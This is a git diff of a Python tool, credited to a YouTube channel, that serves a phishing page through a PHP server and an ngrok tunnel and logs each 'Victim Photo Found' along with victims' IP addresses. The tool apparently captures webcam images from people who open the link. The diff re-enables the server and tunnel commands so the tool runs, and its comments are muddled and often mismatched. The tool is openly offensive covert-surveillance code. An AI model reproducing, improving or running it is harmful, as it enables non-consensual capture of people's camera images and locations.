@@ -1,4 +1,4 @@
-# Coded by @INDIA_TECH YOUTUBE CHANNEL
+# Coded by @INDIATECHYOUTUBE
 # Github : https://github.com/INDIATECHYOUTUBE
 # Don't copy the code
 # Donate author on paypal if use any part of the code....
@@ -27,7 +27,6 @@ def check_ip_cam():
                 ip_file.close()
                 os.system('del ipfile.txt')
             return check_ip_cam()
-    # print(colored("[!] Waiting For Images of Victim through link!", 'green'))
         if images_log.exists():
             print("\n")
             print(colored("[++] Victim Photo Found ", 'green'))
@@ -46,7 +45,7 @@ def start_server_php():
         for url in ngrok_url:                                 # After finding word you will get url i.e http://.....ngrok.io
             with open('template.php') as  infile:           # Reading data                                                               #  from saycheese.html
                 data = infile.read()                          #               From paycam.html
-            data = data.replace('forwarding_link', url)       # Replacing forwarding_link
+            data = data.replace('link', url)               # Replacing forwarding_link
             with open('index.php', 'w') as outfile:
                 outfile.write(data)               # Writing data
                 url_file_to_read.close()
@@ -60,10 +59,10 @@ def start_server_html():
         for url in ngrok_url:                                 # After finding word you will get url i.e http://.....ngrok.io
             with open('pycam.html') as  infile:           # Reading data                                                               #  from saycheese.html
                 data = infile.read()                          #               From paycam.html
-            data = data.replace('forwarding_link', url)       # Replacing forwarding_link
+            data = data.replace('link', url)       # Replacing forwarding_link
             with open('index2.html', 'w') as outfile:
-                outfile.write(data)
-            url_file_to_read.close()                       # Writing data
+                outfile.write(data)                 # Writing data
+            url_file_to_read.close()                       
             start_server_php()
 def catch_url():
     url_file_to_read = open('url_data.txt', 'r')
@@ -95,10 +94,9 @@ def ngrok():
 def yes_opt():
     try:
         print(colored("[+] Starting Php Server", 'blue'))
-        # os.system("start /b php -S 127.0.0.1:3333 > nul & ")
+        os.system("start /b php -S 127.0.0.1:3333 > nul & ")
         print(colored("[+] Starting Ngrok ", 'blue'))
-        os.system('devnull.sh')
-        # os.system("start /b ngrok http 127.0.0.1:3333 > nul &")
+        os.system("start /b ngrok http 127.0.0.1:3333 > nul &")
         print("Start this application again to run correctely, If you are using for first time OR if you close it totally")
     except:
         print(colored(" : ( Something went wrong", 'red'))
@@ -163,19 +161,9 @@ def req():
         time.sleep(5)
         exit()
 
-def system():
-    if platform.system() == 'Windows':
-        print(colored("[*] You are using",'blue'))
-        print(colored('================= Windows', 'green'))
-        os.system('pause')
-    else:
-        print(colored("You are not using Windows", 'red'))
-        time.sleep(3)
-        exit()
 if __name__ == "__main__":
-    # system()
-    # req()
-    # cho()
+    req()
+    cho()
     banner()
     yes_opt()
     ngrok()
